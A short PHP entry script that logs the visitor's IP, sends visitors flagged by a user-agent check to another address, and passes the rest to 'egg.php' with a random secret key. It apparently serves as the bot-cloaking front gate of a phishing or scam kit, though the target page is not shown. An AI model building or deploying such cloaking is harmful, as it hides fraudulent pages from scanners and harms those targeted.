<?php
ini_set('display_errors', false);
session_start();
require_once('inc/configuration.php');
require_once('inc/functions.php');
require_once('inc/intro_logs.php');

$user_ip = $_SERVER['REMOTE_ADDR'];




if (checkUserAgent($_SERVER['HTTP_USER_AGENT']) == true) {
	        header('Location: ' . $redirect);
	        exit;
}


$_SESSION['safe'] = 1;
header('Location: egg.php?secret_key=' . randomString(30));
exit;
?>








